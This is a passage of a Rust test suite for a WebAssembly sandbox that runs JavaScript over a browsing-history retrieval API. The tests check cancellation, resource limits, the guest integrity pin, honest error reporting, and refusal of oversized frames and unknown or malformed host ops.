    let flag = Arc::new(AtomicBool::new(false));
    let control: Arc<dyn AiRunControl> = Arc::new(FlagControl(flag.clone()));
    let flag_for_thread = flag.clone();
    std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(120));
        flag_for_thread.store(true, Ordering::Relaxed);
    });
    let rt = runtime();
    let (_paths, context) = empty_context();
    let outcome = execute_guest(
        spin_guest.as_bytes(),
        "_start",
        "",
        &context,
        rt.handle().clone(),
        Some(control),
        u64::MAX,
    )
    .expect("setup ok");
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Cancelled));
    assert!(outcome.error.is_none());
}

#[test]
fn pre_cancelled_host_call_is_refused_in_real_js() {
    // A run already cancelled before the first host call: the call is refused at the host-call
    // boundary (Cancelled recorded, channel closed → the global throws) rather than executing
    // retrieval. The real guest reports the thrown error path, and no retrieval ran.
    let flag = Arc::new(AtomicBool::new(true)); // already cancelled
    let control: Arc<dyn AiRunControl> = Arc::new(FlagControl(flag));
    let rt = runtime();
    let (_paths, context) = seeded_context();
    let source = "return query_history({ query: 'x' });";
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), Some(control));
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Cancelled));
    assert!(outcome.host_calls.is_empty(), "no retrieval ran for the refused call");
}

// ---- Host-API correctness vs a direct search -------------------------------------------------

#[test]
fn query_history_matches_a_direct_search_over_the_same_plane() {
    // The rows the real guest surfaces (via the host API) match what a direct search_history_internal
    // returns over the same plane (no provider = bm25/lexical) — code-mode reuses the SAME retrieval.
    let (_paths, context) = seeded_context();
    let source = r#"
        const a = query_history({ query: "rust", plane: "bm25" });
        return a.rows.map(r => r.id);
    "#;
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert_eq!(outcome.limits_hit, None);
    assert!(outcome.citations.iter().any(|c| c.history_id == 101));

    let direct = rt
        .block_on(search_history_internal(
            &context.paths,
            &context.config,
            None,
            None,
            &AiSearchRequest {
                query: "rust".to_string(),
                profile_id: None,
                domain: None,
                limit: Some(8),
                cursor: None,
                starred_only: None,
            },
        ))
        .expect("direct search");
    let direct_ids: Vec<i64> = direct.items.iter().map(|i| i.history_id).collect();
    assert!(direct_ids.contains(&101));
    for id in &direct_ids {
        assert!(outcome.citations.iter().any(|c| c.history_id == *id), "id {id} cited");
    }
}

#[test]
fn the_async_bridge_is_safe_from_inside_a_runtime_worker() {
    // C-1: prove the production "runtime within a runtime" path. In production the host fn drives the
    // async retrieval via `block_in_place` + `Handle::block_on` while the sync wasm call runs on a
    // runtime worker thread. The other tests call `run_code_in_sandbox` from OUTSIDE any async
    // context, so this is the one test that exercises the bridge in its real in-runtime shape.
    //
    // `block_on` cannot recurse on the same runtime, so we enter the runtime (`rt.block_on`) and then
    // hand the sandbox call to a blocking thread via `spawn_blocking` — that closure runs on a genuine
    // runtime worker, exactly where `block_in_place` is valid. We assert it completes without
    // deadlock/panic and returns the right rows (the seeded `rust` page is queried + cited).
    let (_paths, context) = seeded_context();
    let rt = runtime();
    let handle = rt.handle().clone();
    let source = r#"
        const a = query_history({ query: "rust", plane: "bm25", limit: 10 });
        return { count: a.rows.length, ids: a.rows.map(r => r.id) };
    "#;
    let outcome = rt.block_on(async move {
        let inner_handle = handle.clone();
        // spawn_blocking runs on a runtime worker; `run_code_in_sandbox`'s host fn then does
        // block_in_place + block_on(inner_handle) — the production "runtime within runtime" path.
        tokio::task::spawn_blocking(move || {
            run_code_in_sandbox(source, &context, inner_handle, None)
        })
        .await
        .expect("the in-runtime sandbox call joins without panic/deadlock")
    });

    assert!(outcome.error.is_none(), "in-runtime bridge ran cleanly, got: {:?}", outcome.error);
    assert_eq!(outcome.limits_hit, None);
    assert_eq!(outcome.host_calls.len(), 1, "the query_history host call ran across the bridge");
    let distilled: Value = serde_json::from_str(&outcome.model_text).expect("valid JSON");
    assert_eq!(
        distilled["count"], 1,
        "the seeded rust page resolved through the bridged retrieval"
    );
    assert!(outcome.citations.iter().any(|c| c.history_id == 101), "the bridged row is cited");
}

// ---- Honest failures + refusals (no host panic) ----------------------------------------------

#[test]
fn a_thrown_js_error_is_an_honest_outcome_not_a_panic() {
    // A runtime error in the guest JS (referencing an undefined variable) surfaces as an honest
    // CodeOutcome.error with NO limit — never a host panic.
    let (_paths, context) = empty_context();
    let rt = runtime();
    let outcome =
        run_code_in_sandbox("return notDefinedAnywhere.boom;", &context, rt.handle().clone(), None);
    assert!(outcome.error.is_some(), "a thrown error is honest");
    assert_eq!(outcome.limits_hit, None);
    assert!(outcome.model_text.is_empty());
}

#[test]
fn a_syntax_error_is_an_honest_outcome_not_a_panic() {
    // A JS syntax error is caught by the harness and reported via the error op → honest outcome.
    let (_paths, context) = empty_context();
    let rt = runtime();
    let outcome =
        run_code_in_sandbox("this is ( not valid javascript", &context, rt.handle().clone(), None);
    assert!(outcome.error.is_some(), "a syntax error is honest");
    assert!(outcome.model_text.is_empty());
}

#[test]
fn an_empty_query_returns_the_most_recent_visits() {
    // A query_history with an empty query is NOT refused — it returns the most recent visits
    // (browse-by-recency), the agent's entry point for enumerating history / finding the date range.
    // The seeded archive has two visits, so both surface and the call records a host call cleanly.
    let (_paths, context) = seeded_context();
    let source = "return query_history({ query: '  ' }).rows.length;";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert!(outcome.error.is_none(), "the empty query is honored, got {:?}", outcome.error);
    assert_eq!(outcome.host_calls.len(), 1, "the recency call is recorded");
    assert_eq!(outcome.model_text, "2", "both seeded visits surface as recent rows");
}

#[test]
fn an_oversized_fetch_ids_list_is_refused() {
    // A fetch_visits over the id cap is refused at the host (the bail branch → channel closes).
    let (_paths, context) = seeded_context();
    let source = format!(
        "return fetch_visits([{}]);",
        (0..(MAX_FETCH_IDS as i64 + 5)).map(|n| n.to_string()).collect::<Vec<_>>().join(",")
    );
    let rt = runtime();
    let outcome = run_code_in_sandbox(&source, &context, rt.handle().clone(), None);
    assert!(outcome.host_calls.is_empty());
    assert!(outcome.error.is_some(), "the refused over-cap fetch threw");
}

#[test]
fn an_empty_fetch_ids_list_is_refused() {
    // An empty `ids` array is refused (the host never runs a retrieval for an empty lookup).
    let (_paths, context) = seeded_context();
    let source = "return fetch_visits([]);";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert!(outcome.host_calls.is_empty());
    assert!(outcome.error.is_some());
}

#[test]
fn the_public_entry_runs_the_committed_guest_cleanly() {
    // The committed guest passes its integrity pin and a trivial program runs to a clean output.
    let rt = runtime();
    let (_paths, context) = empty_context();
    let outcome = run_code_in_sandbox("return 'ok';", &context, rt.handle().clone(), None);
    assert!(outcome.error.is_none(), "got error: {:?}", outcome.error);
    assert!(outcome.host_calls.is_empty());
    assert_eq!(outcome.model_text, "\"ok\"");
    assert_eq!(outcome.source, "return 'ok';");
}

#[test]
fn a_void_program_yields_an_empty_output() {
    // A program that returns nothing (undefined) yields a `null` JSON output (the harness maps
    // undefined → null), never an error.
    let rt = runtime();
    let (_paths, context) = empty_context();
    let outcome = run_code_in_sandbox("const x = 1;", &context, rt.handle().clone(), None);
    assert!(outcome.error.is_none());
    assert_eq!(outcome.model_text, "null");
}

// ---- Compile / integrity / setup failures (pure-ish, real runtime where it matters) ----------

#[test]
fn a_compile_error_becomes_an_honest_outcome_not_a_panic() {
    // execute_guest never panics on a guest that fails to compile (invalid WAT/wasm) — it returns
    // Err, which the public entry maps to an honest outcome (see outcome_from_setup_error below).
    let rt = runtime();
    let (_paths, context) = empty_context();
    let result = execute_guest(
        b"(module (this is not wat))",
        "_start",
        "",
        &context,
        rt.handle().clone(),
        None,
        u64::MAX,
    );
    let error = result.expect_err("invalid wasm must fail to compile");
    let outcome = outcome_from_setup_error("bad", &error);
    assert!(outcome.error.is_some());
    assert!(outcome.model_text.is_empty());
    assert_eq!(outcome.source, "bad");
}

#[test]
fn outcome_from_setup_error_is_an_honest_empty_outcome() {
    let outcome = outcome_from_setup_error("src", &anyhow::anyhow!("boom"));
    assert_eq!(outcome.source, "src");
    assert_eq!(outcome.error.as_deref(), Some("boom"));
    assert!(outcome.model_text.is_empty());
    assert!(outcome.citations.is_empty());
    assert_eq!(outcome.limits_hit, None);
}

#[test]
fn guest_integrity_check_passes_for_the_pin_and_fails_for_a_mismatch() {
    assert!(guest_integrity_ok(GUEST_WASM, GUEST_WASM_SHA256));
    assert!(!guest_integrity_ok(GUEST_WASM, "deadbeef"));
    assert!(!guest_integrity_ok(b"tampered", GUEST_WASM_SHA256));
}

#[test]
fn a_failed_integrity_pin_yields_an_honest_outcome_via_the_public_mapping() {
    // Drives the integrity-failure path (a wrong pin) through the SAME error→outcome mapping the
    // public entry uses: fail closed, honest error, no panic.
    let rt = runtime();
    let (_paths, context) = empty_context();
    let outcome =
        run_guest_or_outcome("src", &context, rt.handle().clone(), None, GUEST_WASM, "wrong-pin");
    assert!(outcome.error.as_deref().is_some_and(|e| e.contains("integrity pin")));
    assert!(outcome.model_text.is_empty());
    assert_eq!(outcome.source, "src");
}

#[test]
fn a_genuine_guest_fault_is_an_honest_error_not_a_limit() {
    // A guest that hits `unreachable` (a real fault, not a resource limit) yields an honest error
    // with NO limits_hit — the classifier does not mislabel a bug as a limit.
    let fault_guest = r#"
        (module
          (memory (export "memory") 2)
          (func (export "_start") (unreachable)))
    "#;
    let rt = runtime();
    let (_paths, context) = empty_context();
    let outcome = execute_guest(
        fault_guest.as_bytes(),
        "_start",
        "",
        &context,
        rt.handle().clone(),
        None,
        u64::MAX,
    )
    .expect("setup ok");
    assert_eq!(outcome.limits_hit, None);
    assert!(outcome.error.is_some(), "a genuine fault is an honest error");
}

#[test]
fn bounded_limiter_delegates_and_records_memory_refusals() {
    // Direct unit test of the limiter: a growth within the cap is allowed (not recorded); the table
    // delegate and accessors return the inner StoreLimits values.
    let inner = StoreLimitsBuilder::new().memory_size(128 * 1024).build();
    let mut limiter = BoundedLimiter { inner, memory_refused: false };
    assert!(limiter.memory_growing(0, 64 * 1024, None).unwrap());
    assert!(!limiter.memory_refused);
    assert!(!limiter.memory_growing(0, 256 * 1024, None).unwrap());
    assert!(limiter.memory_refused);
    assert!(limiter.table_growing(0, 1, None).unwrap());
    let _ = limiter.instances();
    let _ = limiter.tables();
    let _ = limiter.memories();
}

#[test]
fn flag_control_checkpoint_errors_only_when_cancelled() {
    // The test FlagControl: checkpoint is Ok while not cancelled, Err once cancelled.
    let flag = Arc::new(AtomicBool::new(false));
    let control = FlagControl(flag.clone());
    control.checkpoint("ok").expect("not cancelled yet");
    assert!(!control.cancelled());
    flag.store(true, Ordering::Relaxed);
    assert!(control.checkpoint("now").is_err());
    assert!(control.cancelled());
}

#[test]
fn an_oversized_request_frame_poisons_the_channel() {
    // Direct unit test of the host-side framing defense: a frame claiming a length past
    // MAX_REQUEST_FRAME_BYTES poisons the channel (no unbounded buffering), and further writes are
    // ignored. This guards the host even from a hostile guest that bypasses harness.js.
    let (_paths, context) = empty_context();
    let rt = runtime();
    let host = HostState {
        context,
        runtime: rt.handle().clone(),
        control: None,
        source: String::new(),
        host_calls_made: 0,
        output: Vec::new(),
        records: Vec::new(),
        citations: Vec::new(),
        limits_hit: None,
        guest_error: None,
    };
    let mut channel = RpcChannel {
        host,
        request_buf: Vec::new(),
        reply_buf: Vec::new(),
        reply_pos: 0,
        poisoned: false,
    };
    // A length prefix claiming 2 MiB (> the 1 MiB cap).
    let huge_len = (MAX_REQUEST_FRAME_BYTES as u32 + 1).to_le_bytes();
    channel.push_request_bytes(&huge_len);
    assert!(channel.poisoned, "an over-cap frame poisons the channel");
    // A subsequent write is ignored (no buffering, no reply).
    channel.push_request_bytes(b"more bytes");
    assert!(channel.reply_buf.is_empty(), "no reply queued for a poisoned channel");
    assert!(channel.drain_reply(16).is_empty());
}

#[test]
fn an_oversized_raw_write_poisons_the_channel_via_the_buffer_cap() {
    // B-3 defense-in-depth: a single huge write whose bytes do NOT begin with a valid small frame is
    // caught by the RAW buffer cap (MAX_REQUEST_BUFFER_BYTES), independently of the guest's
    // StoreLimits — BEFORE any declared frame length is even trusted. This covers the path the
    // declared-length check (an_oversized_request_frame_poisons_the_channel) does not: the leading
    // length bytes here decode to a SMALL frame (the body just never arrives), so only the host's own
    // buffer bound stops the host from buffering up to the guest's whole linear memory.
    let (_paths, context) = empty_context();
    let rt = runtime();
    let host = HostState {
        context,
        runtime: rt.handle().clone(),
        control: None,
        source: String::new(),
        host_calls_made: 0,
        output: Vec::new(),
        records: Vec::new(),
        citations: Vec::new(),
        limits_hit: None,
        guest_error: None,
    };
    let mut channel = RpcChannel {
        host,
        request_buf: Vec::new(),
        reply_buf: Vec::new(),
        reply_pos: 0,
        poisoned: false,
    };
    // A 4-byte prefix declaring a TINY frame (so the declared-length cap stays silent), then a flood
    // of body bytes far past the raw buffer cap — the frame body for that tiny declared length never
    // completes, so without the raw cap the host would keep buffering unboundedly.
    let mut write = 4u32.to_le_bytes().to_vec();
    write.extend(std::iter::repeat_n(b'A', MAX_REQUEST_BUFFER_BYTES + 1));
    channel.push_request_bytes(&write);
    assert!(channel.poisoned, "an over-cap raw write poisons the channel via the buffer cap");
    assert!(
        channel.request_buf.is_empty(),
        "the poisoned buffer is cleared (no unbounded retention)"
    );
    // A subsequent write is ignored (no buffering, no reply) — the channel stays closed for the guest.
    channel.push_request_bytes(b"more bytes");
    assert!(channel.reply_buf.is_empty(), "no reply queued for a poisoned channel");
    assert!(channel.drain_reply(16).is_empty());
}

#[test]
fn service_request_refuses_an_unknown_op_and_malformed_json() {
    // The RPC service refuses an unknown op and malformed JSON (returns None → channel closes), never
    // a panic. Exercised directly so the refusal contract is pinned without a bespoke guest.
    let (_paths, context) = empty_context();
    let rt = runtime();
    let mut host = HostState {
        context,
        runtime: rt.handle().clone(),
        control: None,
        source: "the source".to_string(),
        host_calls_made: 0,
        output: Vec::new(),
        records: Vec::new(),
        citations: Vec::new(),
        limits_hit: None,
        guest_error: None,
    };
    // Unknown op → refused.
    assert!(host.service_request(br#"{"op":"delete_everything"}"#).is_none());
    // Malformed JSON → refused.
    assert!(host.service_request(b"not json at all").is_none());
    // The `source` op always answers with the staged source (no budget consumed).
    let reply = host.service_request(br#"{"op":"source"}"#).expect("source op answers");
    let value: Value = serde_json::from_slice(&reply).unwrap();
    assert_eq!(value["source"], "the source");
    assert_eq!(host.host_calls_made, 0, "source does not consume the budget");
}

/// A bare [`HostState`] over an empty context for direct unit tests of the pure host logic.
fn bare_host(rt: &tokio::runtime::Runtime) -> HostState {
    let (_paths, context) = empty_context();
    HostState {
        context,
        runtime: rt.handle().clone(),
        control: None,
        source: String::new(),
        host_calls_made: 0,
        output: Vec::new(),
        records: Vec::new(),
        citations: Vec::new(),
        limits_hit: None,
        guest_error: None,
    }
}

#[test]
fn capture_result_handles_a_value_less_result_op() {
    // A `result` op with NO `value` field (a guest that signals done without a payload) yields an
    // empty output, never a panic. (The harness always sends `value`, but the host must be robust.)
    let rt = runtime();
    let mut host = bare_host(&rt);
    let reply = host.service_request(br#"{"op":"result"}"#).expect("result op answers");
    let value: Value = serde_json::from_slice(&reply).unwrap();
    assert_eq!(value["ok"], true);
    assert!(host.output.is_empty(), "a value-less result yields no output");
}

#[test]
fn service_request_refuses_a_host_call_with_malformed_args() {
    // A query_history / fetch_visits op whose `args` cannot deserialize into the typed struct (e.g. a
    // string where an object is expected) is refused at parse time (None → channel closes), never a
    // panic. This pins the args-parse branch in service_request without a bespoke guest.
    let rt = runtime();
    let mut host = bare_host(&rt);
    assert!(host.service_request(br#"{"op":"query_history","args":"not an object"}"#).is_none());
    assert!(
        host.service_request(br#"{"op":"fetch_visits","args":{"ids":"not an array"}}"#).is_none()
    );
    assert_eq!(host.host_calls_made, 0, "a parse-refused call never reached the budget");
}

#[test]
fn service_request_records_a_guest_error_op() {
    // The `error` op records the guest-reported JS error message for the honest outcome.
    let rt = runtime();
    let mut host = bare_host(&rt);
    let reply = host
        .service_request(br#"{"op":"error","message":"boom in JS"}"#)
        .expect("error op answers");
    let value: Value = serde_json::from_slice(&reply).unwrap();
    assert_eq!(value["ok"], true);
    assert_eq!(host.guest_error.as_deref(), Some("boom in JS"));
}

#[test]
fn assemble_outcome_keeps_a_recorded_limit_over_a_subsequent_trap() {
    // The precedence branch: when a hard limit was already recorded host-side (e.g. HostCalls) AND
    // the run then traps, the recorded limit wins over the generic trap classification. Driven
    // directly through the pure assembler so the precedence contract is pinned deterministically.
    let rt = runtime();
    let mut host = bare_host(&rt);
    host.limits_hit = Some(LimitsHit::HostCalls);
    let trapped: Result<()> = Err(wasmtime::Trap::UnreachableCodeReached.into());
    let outcome = assemble_outcome("src", host, trapped, false, false);
    assert_eq!(outcome.limits_hit, Some(LimitsHit::HostCalls));
    assert!(outcome.error.is_none(), "a recorded limit + trap is a clean limit, not an error");
}

#[test]
fn the_scoped_wasi_stream_glue_is_inert_where_the_sync_path_skips_it() {
    // The WASI stream/clock trait glue the SYNC linker never calls (`async_stream`, `Pollable::ready`,
    // the clock `resolution`s, and the stderr NullSink) is still exercised directly so the security
    // boundary's trait surface is fully covered — every piece behaves as the inert shim it is.
    let channel = Arc::new(std::sync::Mutex::new(RpcChannel {
        host: bare_host(&runtime()),
        request_buf: Vec::new(),
        reply_buf: Vec::new(),
        reply_pos: 0,
        poisoned: false,
    }));

    // The stdin/stdout `async_stream` fallbacks (unused by the sync linker) construct cleanly.
    let stdin = ReplyStdin(channel.clone());
    let _ = stdin.async_stream();
    let stdout = RequestStdout(channel.clone());
    let _ = stdout.async_stream();
    let stderr = SinkStderr;
    let _ = stderr.async_stream();

    // The fixed clocks' `resolution()` (the engine reads `now()`; `resolution()` rounds out the API).
    assert_eq!(ZeroWallClock.resolution(), Duration::from_secs(1));
    assert_eq!(ZeroWallClock.now(), Duration::ZERO);
    assert_eq!(ZeroMonotonicClock.resolution(), 1);
    assert_eq!(ZeroMonotonicClock.now(), 0);

    // The stderr NullSink discards writes and reports infinite write room.
    let mut sink = NullSink;
    sink.write(bytes::Bytes::from_static(b"ignored")).expect("write ok");
    sink.flush().expect("flush ok");
    assert_eq!(sink.check_write().expect("check_write ok"), usize::MAX);

    // `Pollable::ready` resolves immediately for every stream (no real async wait).
    let rt = runtime();
    rt.block_on(async {
        ReplyInput(channel.clone()).ready().await;
        RequestOutput(channel.clone()).ready().await;
        NullSink.ready().await;
    });
}
